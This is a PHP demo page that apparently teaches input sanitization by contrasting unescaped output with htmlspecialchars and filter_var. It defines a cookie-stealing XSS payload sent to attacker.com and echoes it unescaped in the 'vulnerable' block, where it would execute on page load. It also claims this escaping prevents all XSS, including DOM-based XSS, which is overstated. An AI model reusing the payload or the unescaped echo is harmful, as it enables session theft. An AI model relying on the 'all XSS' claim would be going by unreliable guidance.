<?php
// Countermeasure 3: Input Sanitization Demo
$malicious_xss = '<script>alert("XSS Attack!"); new Image().src="http://attacker.com/steal?c="+document.cookie;</script>';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Countermeasure 3: Input Sanitization</title>
    <style>
        .vulnerable { border: 3px solid red; padding: 10px; margin: 10px; }
        .secure { border: 3px solid green; padding: 10px; margin: 10px; }
        code { background: #f0f0f0; padding: 2px 5px; }
    </style>
</head>
<body>
    <h2>Countermeasure 3: Input Sanitization</h2>
    
    <div class="vulnerable">
        <h3>❌ Vulnerable Output (No Sanitization)</h3>
        <p>Malicious input: <code><?php echo htmlspecialchars($malicious_xss); ?></code></p>
        <p><strong>Result (DANGER - XSS would execute):</strong></p>
        <div style="background: #ffe6e6; padding: 10px;">
            <?php echo $malicious_xss; ?>
        </div>
        <p><em>If this was a real attack, the script would execute!</em></p>
    </div>
    
    <div class="secure">
        <h3>✅ Secure Output (With htmlspecialchars)</h3>
        <p>Using: <code>htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code></p>
        <p><strong>Result (SAFE - XSS neutralized):</strong></p>
        <div style="background: #e6ffe6; padding: 10px;">
            <?php echo htmlspecialchars($malicious_xss, ENT_QUOTES, 'UTF-8'); ?>
        </div>
        <p><em>The script is displayed as harmless text!</em></p>
    </div>
    
    <div class="secure">
        <h3>✅ Alternative: filter_var</h3>
        <p>Using: <code>filter_var($input, FILTER_SANITIZE_SPECIAL_CHARS)</code></p>
        <div style="background: #e6ffe6; padding: 10px;">
            <?php echo filter_var($malicious_xss, FILTER_SANITIZE_SPECIAL_CHARS); ?>
        </div>
    </div>
    
    <h3>What Happens:</h3>
    <ul>
        <li><strong>Vulnerable:</strong> &lt;script&gt; tags execute as JavaScript</li>
        <li><strong>Secure:</strong> &lt;script&gt; becomes &amp;lt;script&amp;gt; (harmless text)</li>
        <li><strong>Prevents:</strong> All XSS attacks (reflected, stored, DOM)</li>
    </ul>
    
    <p><strong>Explanation:</strong> Input sanitization converts special characters to HTML entities,
    rendering malicious scripts as plain text instead of executable code.</p>
</body>
</html>
